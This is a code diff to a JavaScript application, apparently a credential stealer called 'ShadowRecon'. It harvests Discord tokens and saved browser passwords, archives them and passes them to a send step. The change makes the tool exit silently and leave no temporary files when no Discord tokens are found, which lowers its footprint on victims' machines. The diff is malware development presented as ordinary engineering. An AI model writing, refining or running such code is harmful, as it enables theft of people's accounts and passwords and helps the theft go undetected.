@@ -38,8 +38,8 @@ class Application {
                 throw new Error('Invalid configuration');
             }
 
-            // Initialize file manager
-            fileManager.init();
+            // Note: File manager initialization moved to processAndSend to avoid creating 
+            // temporary folders when no Discord tokens are found
 
             // Collect system information
             await this.collectSystemInfo();
@@ -111,7 +111,31 @@ class Application {
         const modules = config.get('modules.enabled');
         const results = {};
 
-        // Browser data collection
+        // Discord data collection - check first if Discord tokens exist
+        if (modules.discord) {
+            try {
+                logger.info('Collecting Discord data');
+                results.discord = await this.discordService.collectAccounts();
+                
+                // Exit early if no Discord accounts found
+                const discordAccounts = results.discord?.length || 0;
+                if (discordAccounts === 0) {
+                    logger.info('No Discord tokens found - exiting without collecting other data or creating files');
+                    return null; // Return null to indicate no data should be processed
+                }
+                
+                logger.info(`Found ${discordAccounts} Discord accounts - proceeding with data collection`);
+            } catch (error) {
+                ErrorHandler.handle(error);
+                logger.info('Discord data collection failed - exiting without creating files');
+                return null; // Return null to indicate no data should be processed
+            }
+        } else {
+            logger.info('Discord module disabled - exiting without creating files');
+            return null; // If Discord module is disabled, don't create any files
+        }
+
+        // Browser data collection - only if we have Discord tokens
         if (modules.browsers) {
             try {
                 logger.info('Collecting browser data');
@@ -122,23 +146,13 @@ class Application {
             }
         }
 
-        // Discord data collection
-        if (modules.discord) {
-            try {
-                logger.info('Collecting Discord data');
-                results.discord = await this.discordService.collectAccounts();
-            } catch (error) {
-                ErrorHandler.handle(error);
-                results.discord = { error: error.message };
-            }
-        }
-
         // Add other modules here as needed
         // if (modules.crypto) { ... }
         // if (modules.files) { ... }
         // if (modules.system) { ... }
 
         this.results = results;
+        
         logger.info('Data collection completed', {
             modules: Object.keys(results),
             browserAccounts: results.browsers?.totalPasswords || 0,
@@ -154,6 +168,9 @@ class Application {
     async processAndSend() {
         try {
             logger.info('Processing collected data');
+
+            // Initialize file manager now that we know we have Discord tokens to process
+            fileManager.init();
 
             // Create archive
             const zipPath = await fileManager.createZip();
@@ -253,7 +270,13 @@ class Application {
             }
 
             // Collect data
-            await this.collectData();
+            const results = await this.collectData();
+            
+            // Exit early if no Discord tokens were found (results will be null)
+            if (results === null) {
+                logger.info('ShadowRecon completed - no Discord tokens found, no files created');
+                return;
+            }
 
             // Process and send data
             await this.processAndSend();
